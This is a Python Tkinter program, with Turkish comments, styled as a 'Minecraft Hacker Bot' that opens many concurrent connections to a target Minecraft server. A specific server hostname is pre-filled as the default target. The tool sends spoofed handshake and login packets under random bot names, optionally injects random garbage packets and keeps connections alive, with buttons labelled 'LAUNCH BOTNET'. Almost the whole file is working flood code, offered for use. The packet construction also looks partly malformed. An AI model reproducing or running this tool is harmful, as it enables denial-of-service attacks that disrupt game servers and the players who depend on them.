import socket
import threading
import time
import random
from tkinter import *
from tkinter import ttk, messagebox, font
import pyfiglet
from PIL import Image, ImageTk
import os


class HackerStyleBotTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Minecraft Hacker Bot v3.0")
        self.root.geometry("800x650")
        self.root.configure(bg='black')

        # Hacker teması
        self.bg_color = 'black'
        self.fg_color = '#00ff00'  # Matrix yeşili
        self.accent_color = '#ff0000'  # Kırmızı aksan

        # Bot kontrol değişkenleri
        self.running = False
        self.bot_count = 0
        self.active_bots = 0
        self.threads = []

        # Hacker fontları
        self.title_font = font.Font(family='Courier', size=18, weight='bold')
        self.label_font = font.Font(family='Courier', size=12)
        self.button_font = font.Font(family='Courier', size=12, weight='bold')

        # Arayüzü oluştur
        self.create_widgets()

    def create_widgets(self):
        # Başlık
        title_frame = Frame(self.root, bg=self.bg_color)
        title_frame.pack(pady=10)

        ascii_title = pyfiglet.figlet_format("MC BOT", font="slant")
        self.title_label = Label(title_frame, text=ascii_title, fg=self.fg_color,
                                 bg=self.bg_color, font=self.label_font)
        self.title_label.pack()

        # Sunucu bilgileri frame
        server_frame = LabelFrame(self.root, text=" TARGET SERVER ", font=self.label_font,
                                  fg=self.fg_color, bg=self.bg_color, bd=2, relief="groove")
        server_frame.pack(pady=10, padx=20, fill="x")

        Label(server_frame, text="IP:", font=self.label_font,
              fg=self.fg_color, bg=self.bg_color).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.server_ip = Entry(server_frame, font=self.label_font,
                               bg='#111111', fg=self.fg_color, insertbackground=self.fg_color)
        self.server_ip.grid(row=0, column=1, sticky="ew", padx=5, pady=2)
        self.server_ip.insert(0, "limexboxpvp.msch.io")

        Label(server_frame, text="PORT:", font=self.label_font,
              fg=self.fg_color, bg=self.bg_color).grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.server_port = Entry(server_frame, font=self.label_font,
                                 bg='#111111', fg=self.fg_color, insertbackground=self.fg_color)
        self.server_port.grid(row=1, column=1, sticky="ew", padx=5, pady=2)
        self.server_port.insert(0, "25565")

        # Bot ayarları frame
        bot_frame = LabelFrame(self.root, text=" BOT ARMY ", font=self.label_font,
                               fg=self.fg_color, bg=self.bg_color, bd=2, relief="groove")
        bot_frame.pack(pady=10, padx=20, fill="x")

        Label(bot_frame, text="BOT COUNT:", font=self.label_font,
              fg=self.fg_color, bg=self.bg_color).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.bot_count_entry = Entry(bot_frame, font=self.label_font,
                                     bg='#111111', fg=self.fg_color, insertbackground=self.fg_color)
        self.bot_count_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=2)
        self.bot_count_entry.insert(0, "100")

        Label(bot_frame, text="CONNECTION SPEED (ms):", font=self.label_font,
              fg=self.fg_color, bg=self.bg_color).grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.connection_speed = Entry(bot_frame, font=self.label_font,
                                      bg='#111111', fg=self.fg_color, insertbackground=self.fg_color)
        self.connection_speed.grid(row=1, column=1, sticky="ew", padx=5, pady=2)
        self.connection_speed.insert(0, "100")

        # Gelişmiş ayarlar frame
        advanced_frame = LabelFrame(self.root, text=" ADVANCED TACTICS ", font=self.label_font,
                                    fg=self.fg_color, bg=self.bg_color, bd=2, relief="groove")
        advanced_frame.pack(pady=10, padx=20, fill="x")

        self.random_packet_var = IntVar(value=1)
        Checkbutton(advanced_frame, text="RANDOM PACKETS", variable=self.random_packet_var,
                    font=self.label_font, fg=self.fg_color, bg=self.bg_color,
                    selectcolor='black', activebackground=self.bg_color,
                    activeforeground=self.fg_color).grid(row=0, column=0, sticky="w", padx=5, pady=2)

        self.random_nick_var = IntVar(value=1)
        Checkbutton(advanced_frame, text="RANDOM NAMES", variable=self.random_nick_var,
                    font=self.label_font, fg=self.fg_color, bg=self.bg_color,
                    selectcolor='black', activebackground=self.bg_color,
                    activeforeground=self.fg_color).grid(row=1, column=0, sticky="w", padx=5, pady=2)

        self.auto_reconnect_var = IntVar(value=1)
        Checkbutton(advanced_frame, text="AUTO RECONNECT", variable=self.auto_reconnect_var,
                    font=self.label_font, fg=self.fg_color, bg=self.bg_color,
                    selectcolor='black', activebackground=self.bg_color,
                    activeforeground=self.fg_color).grid(row=2, column=0, sticky="w", padx=5, pady=2)

        # Durum bilgisi frame
        status_frame = LabelFrame(self.root, text=" BOT NETWORK STATUS ", font=self.label_font,
                                  fg=self.fg_color, bg=self.bg_color, bd=2, relief="groove")
        status_frame.pack(pady=10, padx=20, fill="x")

        self.status_label = Label(status_frame, text="[STATUS] READY", font=self.label_font,
                                  fg="#00ff00", bg=self.bg_color)
        self.status_label.pack(anchor="w", padx=5, pady=5)

        self.active_bots_label = Label(status_frame, text="[ACTIVE BOTS] 0", font=self.label_font,
                                       fg=self.fg_color, bg=self.bg_color)
        self.active_bots_label.pack(anchor="w", padx=5, pady=2)

        # Progress bar
        self.progress = ttk.Progressbar(status_frame, orient="horizontal", length=730,
                                        mode="determinate", style="green.Horizontal.TProgressbar")
        self.progress.pack(pady=10)

        # Butonlar
        button_frame = Frame(self.root, bg=self.bg_color)
        button_frame.pack(pady=20)

        # Başlat butonu
        self.start_button = Button(button_frame, text="[LAUNCH BOTNET]",
                                   command=self.start_bots, font=self.button_font,
                                   bg='#003300', fg=self.fg_color, activebackground='#002200',
                                   activeforeground=self.fg_color, bd=2, relief="raised",
                                   padx=20, pady=10)
        self.start_button.pack(side="left", padx=10)

        # Durdur butonu
        self.stop_button = Button(button_frame, text="[TERMINATE]",
                                  command=self.stop_bots, font=self.button_font,
                                  bg='#330000', fg=self.fg_color, activebackground='#220000',
                                  activeforeground=self.fg_color, bd=2, relief="raised",
                                  padx=20, pady=10, state="disabled")
        self.stop_button.pack(side="left", padx=10)

        # Stil ayarları
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure("green.Horizontal.TProgressbar", troughcolor=self.bg_color,
                             bordercolor=self.fg_color, background=self.fg_color,
                             lightcolor=self.fg_color, darkcolor=self.fg_color)

        # Konsol çıktısı
        self.console_frame = LabelFrame(self.root, text=" CONSOLE OUTPUT ", font=self.label_font,
                                        fg=self.fg_color, bg=self.bg_color, bd=2, relief="groove")
        self.console_frame.pack(pady=10, padx=20, fill="both", expand=True)

        self.console = Text(self.console_frame, bg='#111111', fg=self.fg_color,
                            insertbackground=self.fg_color, font=self.label_font,
                            wrap="word", height=8)
        self.console.pack(fill="both", expand=True, padx=5, pady=5)
        self.console.insert("end", "> System initialized. Ready to launch botnet.\n")
        self.console.config(state="disabled")

    def log(self, message):
        self.console.config(state="normal")
        self.console.insert("end", f"> {message}\n")
        self.console.see("end")
        self.console.config(state="disabled")

    def start_bots(self):
        try:
            self.bot_count = int(self.bot_count_entry.get())
            if self.bot_count <= 0:
                self.log("ERROR: Bot count must be greater than 0")
                messagebox.showerror("Error", "Bot count must be greater than 0!")
                return
        except ValueError:
            self.log("ERROR: Invalid bot count")
            messagebox.showerror("Error", "Invalid bot count!")
            return

        try:
            port = int(self.server_port.get())
        except ValueError:
            self.log("ERROR: Invalid port number")
            messagebox.showerror("Error", "Invalid port number!")
            return

        try:
            speed = int(self.connection_speed.get())
            if speed < 0:
                self.log("ERROR: Connection speed cannot be negative")
                messagebox.showerror("Error", "Connection speed cannot be negative!")
                return
        except ValueError:
            self.log("ERROR: Invalid connection speed")
            messagebox.showerror("Error", "Invalid connection speed!")
            return

        self.running = True
        self.active_bots = 0
        self.update_status()

        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

        self.log(f"Initializing botnet with {self.bot_count} bots...")
        self.log(f"Target: {self.server_ip.get()}:{port}")
        self.log("Establishing connections...")

        # Botları başlat
        threading.Thread(target=self.launch_bot_army, args=(speed,)).start()

    def launch_bot_army(self, speed):
        for i in range(self.bot_count):
            if not self.running:
                break

            t = threading.Thread(target=self.connect_bot)
            t.daemon = True
            t.start()
            self.threads.append(t)

            # Belirtilen hızda bağlantı kur
            time.sleep(speed / 1000)

        if self.running:
            self.log(f"Botnet deployment complete. {self.active_bots} active connections.")

    def stop_bots(self):
        self.running = False
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        self.status_label.config(text="[STATUS] TERMINATING...", fg=self.accent_color)
        self.log("Terminating all bot connections...")

    def connect_bot(self):
        try:
            ip = self.server_ip.get()
            port = int(self.server_port.get())

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))

            # Minecraft handshake spoof
            version = b"\x00"  # Protocol version
            host_len = bytes([len(ip.encode())])
            host = ip.encode()
            port_bytes = port.to_bytes(2, byteorder='big')
            state = b"\x02"  # Login state

            handshake = b"\x00" + version + host_len + host + port_bytes + state
            s.send(handshake)

            # Rastgele isim kullan
            if self.random_nick_var.get():
                username = "Bot_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))
                login_start = b"\x00" + len(username.encode()).to_bytes(2, byteorder='big') + username.encode()
                s.send(login_start)
                self.log(f"Bot connected with username: {username}")
            else:
                self.log("Anonymous bot connected")

            self.active_bots += 1
            self.update_status()

            # Otomatik yeniden bağlanma
            while self.running and self.auto_reconnect_var.get():
                # Rastgele paket gönder
                if self.random_packet_var.get() and random.random() < 0.1:
                    try:
                        packet = bytes([random.randint(0, 255) for _ in range(random.randint(1, 10))])
                        s.send(packet)
                    except:
                        break

                # Bağlantıyı canlı tut
                try:
                    s.send(b"\x00")
                    time.sleep(5)
                except:
                    break

            s.close()

        except Exception as e:
            self.log(f"Connection failed: {str(e)}")
        finally:
            if self.running:
                self.active_bots -= 1
                self.update_status()

    def update_status(self):
        if self.running:
            status_text = f"[STATUS] DEPLOYING - {self.active_bots}/{self.bot_count} ACTIVE"
            self.status_label.config(text=status_text, fg=self.fg_color)
        else:
            self.status_label.config(text="[STATUS] READY", fg="#00ff00")

        self.active_bots_label.config(text=f"[ACTIVE BOTS] {self.active_bots}")

        if self.bot_count > 0:
            self.progress["value"] = (self.active_bots / self.bot_count) * 100
        else:
            self.progress["value"] = 0

        self.root.update()


if __name__ == "__main__":
    root = Tk()

    # Pencereyi ekranın ortasına alma
    window_width = 800
    window_height = 650
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    center_x = int(screen_width / 2 - window_width / 2)
    center_y = int(screen_height / 2 - window_height / 2)
    root.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')

    app = HackerStyleBotTool(root)
    root.mainloop()
